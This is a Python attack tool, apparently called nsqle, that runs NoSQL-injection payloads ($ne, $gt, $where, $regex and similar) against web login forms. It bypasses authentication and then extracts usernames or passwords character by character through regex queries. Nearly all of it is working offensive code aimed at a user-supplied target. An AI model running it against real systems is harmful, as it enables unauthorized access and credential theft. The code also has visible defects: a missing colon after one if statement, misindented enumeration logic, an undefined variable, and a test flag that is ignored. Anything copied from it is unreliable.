#!/usr/bin/env python3

# Tool used to enumerate username and password through NoSQL injections
# For now it tests for injections using the {username'[$ne]' : '', password[$ne] : ''}
# injection payload. If an injection vector is found the script will use regex to
# find matches for each individual character.
# References:
# PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

import string
import click
import re
from sys import stdout, stderr, argv, exit
from requests import post, get, put
from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings()

class bc:
    PURPHEAD = '\033[35m'
    OKBLUE = '\033[34m'
    OKGREEN = '\033[32m'
    WARNING = '\033[33m'
    CYAN = '\033[36m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DEFAULT = '\033[0m'

class CodeInjector:

    def __init__(self, h, r, up, pp, tg, ep, v):
        self.h = h
        self.r = r
        self.up = up
        self.pp = pp
        self.tg = tg
        self.ep = ep
        self.v = v

    def test_injection(self):

        # Payloads used for authentication bypass
        test_payloads = ["[$ne]",
                        "[$gt]",
                        "[true, $where: '1 == 1']",
                        ", $where: '1 == 1'",
                        "$where: '1 == 1'",
                        "', $where: '1 == 1'",
                        "1, $where: '1 == 1'",
                        "[$ne: 1 ]",
                        "', $or: [ {}, { 'a':'a",
                        "' } ], $comment:'successful MongoDB injection'",
                        "db.injection.insert({success:1});",
                        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
                        "[|| 1==1]",
                        "' && this.password.match(/.*/)//+%00",
                        "' && this.passwordzz.match(/.*/)//+%00",
                        "'%20%26%26%20this.password.match(/.*/)//+%00",
                        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
                        "{$gt: ''}",
                        "[$ne]=1]"]

        injectable = []
        for pay in test_payloads:
            stdout.write(f'[+] Injecting "{pay}"...')
            if self.inject(test=True, pay=pay):
                stdout.write(bc.OKGREEN + " Success\n" + bc.DEFAULT)
                injectable.append(pay)
            else:
                stdout.write(bc.FAIL + " Fail\n" + bc.DEFAULT)
        if not len(injectable) < 1:
            stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable\n'+bc.DEFAULT
                                    + '[+] Injectable payloads: \n')

            for p in injectable:
                stdout.write(f'[+] {p}\n')
            return True
            
        else:
            stderr.write(bc.FAIL + f'[-] Host {self.h} is not injectable\n' + bc.DEFAULT)
            exit(0)

    def build_payload(self, test=False, char='', pay=''):

        injection_payloads = {f"{self.up}"  : {self.up + "[$regex]" : "^" + char + ".*", self.pp + "[$ne]" : "" + "," + self.ep},
                              f"{self.pp}"  : {self.pp + "[$regex]" : "^" + char + ".*", self.up + "[$ne]" : "" + "," + self.ep},
                              "test_pay" : {self.up + pay : "", self.pp + pay : "" + "," + self.ep}}
        if test:
            return injection_payloads['test_pay']
        if not test:
            return injection_payloads[self.tg]

    def inject(self, test=False, pay=''):
        badchar = r'&$^*\?+.|'
        payload = self.build_payload(test=True, pay=pay)
        if test:
            if self.r == 'POST':
                test_query = post(self.h, data=payload, allow_redirects=False, verify=False)
                if test_query.status_code == 302:
                    return True
            if self.r == 'GET':
                test_query = get(self.h, data=payload, allow_redirects=False, verify=False)
                if test_query.status_code == 302:
                    return True
        else:
            ml = []
            m = ''

            for c in string.printable:
                if c in badchar:
                    continue
                payload = self.build_payload(char=c)
                if self.r == 'POST'
                    query = post(self.h, data=payload, allow_redirects=False, verify=False)
                    if query.status_code == 302:
                        stdout.write(f'[+] Starting character "{c}"\n'
                                      '[+] Enumerating rest of string...\n')
                elif self.r == 'GET':
                    query = get(self.h, data=payload, allow_redirects=False, verify=False)
                    if query.status_code == 302:
                        stdout.write(f'[+] Starting character "{c}"\n'
                                      '[+] Enumerating rest of string...\n')
                    m += c
                    while True:
                        for cc in string.printable:
                            if cc in badchar:
                                continue
                            payload = self.build_payload(char=(m + cc))
                            query = post(self.h, data=payload, allow_redirects=False, verify=False)
                            if query.status_code == 302:
                                stdout.write(f'[+] Match: "{cc}"\n')
                                m += cc
                                break
                        if query.status_code != 302:
                            ml.append(m)
                            m = ''
                            break

            stdout.write('[+] Results:\n'
                        f'[+] Matches for {self.tg}:\n')
            for s in ml:
                stdout.write(f'[*] {s}\n')

            return ml


def show_banner():
    stdout.write(r'''
                      |
  __ \    __|   _` |  |   _ \
  |   | \__ \  (   |  |   __/
 _|  _| ____/ \__, | _| \___|
                  _|
by disastrpc | github.com/disastrpc
Injection tool for NoSQL database engines like MongoDB'''+'\n\n')

def ex():
    stdout.write(r'''Examples:
nsqle -r POST -U user -P passwd -x login:login -t user http://target.com/login.php
nsqle -r GET -x login:login,session:session -P pass -t pass -o /root/pass_enum.txt https://target.com/'''+'\n\n')

show_banner()
ex()
@click.command()
@click.option('-r','--request',type=click.Choice(['POST','GET']),default='POST',
                    help='Choose request type',show_default=True)
@click.option('-U','userp',default='username',
                    help='Name of the username parameter',show_default=True,metavar='<str>')
@click.option('-P','passwdp',default='password',
                    help='Name of the password parameter',show_default=True,metavar='<str>')
@click.option('-x','--extra-params','extraparam',default=[],
                    help='List of other parameters contained in the URL separated by commas',metavar='<key:val>')
@click.option('-t','--target',show_default=True,required=True,
                    help='Specify parameter to enumerate',metavar='<str>')
@click.option('-o','--output',type=click.Path(), metavar='<path>',
                    help='Output results to .txt file for use with other tools')
@click.argument('host',metavar='http(s)://mywebsite.com/')
def main(
    request='',
    userp='',
    passwdp='',
    extraparam='',
    target='',
    host='',
    output='',
    verbose=False):
    injector = CodeInjector(host, request, userp, passwdp, target, extraparam, verbose)
    stdout.write(f"[+] Target: {host}\n"
    "[+] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n"
    "[+] Injection point: {target}\n"
    "[+] Checking for injectable parameters...\n")

    reg = r'https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)'
    if not re.match(reg, host):
        stderr.write(bc.FAIL + '[-] Invalid URL format ' + bc.DEFAULT + f"'{host}'\n")
        exit(0)

    if injector.test_injection():
        stdout.write("[+] Starting attack...\n")
        results = injector.inject()
        if output:
            write(results, output)

def write(results, output):
    with open(output, 'a') as f:
        for r in results:
            f.write(r+'\n')

if __name__ == '__main__':
    main()
